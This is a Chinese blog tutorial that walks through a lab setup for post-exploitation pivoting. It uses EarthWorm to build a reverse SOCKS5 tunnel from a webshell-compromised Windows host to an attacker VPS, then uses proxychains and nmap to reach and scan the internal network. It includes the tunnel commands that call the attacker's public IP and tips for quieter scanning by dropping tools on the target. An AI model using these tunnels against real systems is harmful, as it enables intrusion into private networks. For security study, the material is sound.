# 基础知识
内网穿透工具：[EW（EarthWorm）](https://link.zhihu.com/?target=http%3A//rootkiter.com/EarthWorm/)
下载地址： [https://github.com/idlefire/ew](https://github.com/idlefire/ew)

### 本文介绍：
1. 如何使用EW做反向Socks5代理
2. 浏览器如何设置Socks5代理访问目标内网Web服务
3. 利用proxychains给终端设置Socks5代理（方便将本地命令行工具的流量代理进目标内网）

![EW](https://leanote.com/api/file/getImage?fileId=5d9ec5b6ab64415a4900090c)



# 基础环境
1. Kali Linux（Attacker 内网 192.168.23.133）后面简称攻击机器
2. Ubuntu 16.04.3（Attacker 公网 144.168.57.70）后面简称公网机器
3. Windows 10（Victim 目标内网 10.74.155.39）后面简称目标机器

网络拓扑：Kali Linux是我本地的一台虚拟机，Ubuntu是公网上的一台 vps，Windows 10 是目标机器，内网IP，部分端口映射到外网，可以访问公网。


# 场景模拟
现在已拿到目标内网一台机器的权限（该机器将80端口映射至外网，Web服务存在漏洞，已拿到webshell）。需要对内网做进一步的渗透，目前我有一台公网的Ubuntu，一台内网的Kali，如何反向Socks5**将Kali的流量代理进目标内网**？

该使用场景为：
![https://github.com/idlefire/ew](https://leanote.com/api/file/getImage?fileId=5d9ec69bab64415a49000949)

# 使用EW做反向Socks5代理
此处仅演示通过EW做反向Socks5代理，正向、多级级联的的代理方式可以参考官方文档。

## 第1步：在公网的Ubuntu上执行如下命令：
``` shell
./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &
```
该命令的意思是说公网机器监听1080和1024端口。等待攻击者机器访问1080端口，目标机器访问1024端口。
![公网 Ubuntu](https://leanote.com/api/file/getImage?fileId=5d9ec6daab64415c470008ed)


## 第2步：目标机器执行如下命令：
``` shell
ew_for_Win.exe -s rssocks -d 144.168.57.70 -e 1024
```
其中-d参数的值为刚刚的公网IP。

Windows 10 目标机器：
![Windows 10 目标机器](https://leanote.com/api/file/getImage?fileId=5d9eca2bab64415a49000aac)
注意这里访问了 1024 端口。

## 第3步：攻击机器Kali通过proxychains或浏览器设置Socks5代理访问目标内网服务


**方法一：Kali 浏览器设置Socks5代理**

![Kali 浏览器设置](https://leanote.com/api/file/getImage?fileId=5d9ec750ab64415a4900094a)


我随便在windows上面开一个web服务：
phpstudy 开一个 Apache:

![Windows 本地 Apache 服务](https://leanote.com/api/file/getImage?fileId=5d9ec779ab64415a49000963)



此时已可以通过Kali攻击机器的浏览器访问目标内网的Web服务：

![10.74.155.39为Windows10的内网IP](https://leanote.com/api/file/getImage?fileId=5d9ec7a5ab64415c47000930)


**方法二：使用proxychains给终端设置Socks5代理**

### 第1步：下载及安装proxychains
``` shell
cd /usr/local/src
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng 
./configure --prefix=/usr --sysconfdir=/etc
make && make install
make install-config
cd .. && rm -rf proxychains-ng
```
![安装完毕](https://leanote.com/api/file/getImage?fileId=5d9ec7d0ab64415c47000932)

这里一路操作下来畅通无阻，仅截图部分操作记录。

### 第2步：编辑proxychains配置文件设置代理
``` shell
vi /etc/proxychains.conf
socks5  144.168.57.70 1080
```

![/etc/proxychains.conf](https://leanote.com/api/file/getImage?fileId=5d9ec7efab64415a49000967)

### 第3步：测试内网穿透是否成功

![测试](https://leanote.com/api/file/getImage?fileId=5d9ec811ab64415a49000969)

因为刚刚说过，windows 10目标机器的127.0.0.1为 Apache 服务。
为什么是 `proxychains4` 这条命令呢？参考：[利用proxychains在终端使用socks5代理 - CSDN博客](https://blog.csdn.net/gengxuelei/article/details/52514603)

但是为什么失败了呢？其实是这里设置错了：

![/etc/proxychains.conf](https://leanote.com/api/file/getImage?fileId=5d9ec842ab64415c47000952)

看命令行的报错，先通过127.0.0.1的9050端口进行代理，就出错了。
所以修改`/etc/proxychains.conf`，把这一行删掉，只留下socks5这一行：

![只留下socks5这一行](https://leanote.com/api/file/getImage?fileId=5d9ec86aab64415c470009d6)

然后访问使用proxychains代理访问 127.0.0.1， 就成功了：

![127.0.0.1](https://leanote.com/api/file/getImage?fileId=5d9ec899ab64415a49000aa3)
![127.0.0.1](https://leanote.com/api/file/getImage?fileId=5d9ec8c8ab64415a49000aa5)

这也就是 Windows 10 的127.0.0.1：

![Windows10 127.0.0.1](https://leanote.com/api/file/getImage?fileId=5d9ec8f4ab64415c47000a12)





# 更进一步：使用proxychains nmap对目标内网扫描
大佬的文章里面提到了通过代理进行nmap扫描：
![大佬文章截图](https://leanote.com/api/file/getImage?fileId=5d9ec914ab64415a49000aa8)

但是亲测使用 kali ip 进行nmap扫描并不对：

nmap 扫 127.0.0.1：
![nmap 扫 127.0.0.1](https://leanote.com/api/file/getImage?fileId=5d9ec932ab64415c47000a14)

nmap 扫 windows 10 主机内网IP：
![nmap 扫 windows 10 主机内网IP](https://leanote.com/api/file/getImage?fileId=5d9ec94eab64415c47000a16)

nmap 扫 kali IP：
![nmap 扫 kali IP](https://leanote.com/api/file/getImage?fileId=5d9ec97cab64415c47000a17)

可以看出，扫 127.0.0.1 和扫 Kali IP的结果是一样的，但是和扫windows10主机内网IP的结果不一样。但是当然是以扫windows10内网IP的结果为准啦。

总结一下：**这里 nmap 的 IP 应该为目标机器内网IP。**就理解为：nmap已经运行在目标windows10上了，但是扫描的时候不能使用127.0.0.1作为IP，而应该是windows10的内网IP。（而且扫描不能用半连接）。

但是前面使用了proxychains代理连，结果本应该是一样的（127.0.0.1和内网IP都指向一个地方），这可能是因为nmap走代理有问题，也就是大佬文中提到的“有的工具流量不走sock5代理，就很尴尬，具体原因不详”。

但是归根结底要使用目标机器的内网IP的，因为有的时候我们还得扫网段。这个代理之后就相当于：
代理架构好了之后，我本地走的代理，理解为我的nmap是运行于目标机器上，但是扫描的IP不能是127.0.0.1，而是目标机器的内网ip。换句话说，就相当于我的这台Kali就是目标机器了（流量层面），就相当于我这台Kali已经在目标内网中了。

但是 @从心开始 群里的大神们说（感谢这群一直耐心教导我的师傅们），不建议通过代理扫描，动静大、速度慢、不稳定、时间长、容易断。

建议的方法：丢一个小工具到目标主机上扫（可以 nc 丢），或者自己写工具。小工具推荐为：portqry 或者有个很好的扫 windows 的叫 runfinger（一半端口扫描借助powershell或/dev/tcp）；hbscan；python写的小工具；ms 的 queryport......

至于为什么放着现成的工具不用自己写呢？因为大部分实战的情况下 并没有那么好的环境，很多操作都需要自己根据环境来编写对应的脚本，主要是一个根据环境定制化。nmap 体积大动静大，我们需要更轻量级定制化的工具。

总之内网穿透了就相当于我们的攻击机器在内网里面了，后面自己发挥......


--------------

参考链接：
[1] [如何通过EW做Socks5代理进行内网渗透](https://zhuanlan.zhihu.com/p/32822159)， 网络安全大事件，童话， 2018年1月10日
[2] [利用proxychains在终端使用socks5代理](https://blog.csdn.net/gengxuelei/article/details/52514603)， CSDN博客，Layne101，2016年9月12日
[3] [渗透技巧——Windows平台运行Masscan和Nmap](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap/)，3g学生博客，3g学生，2017年7月5日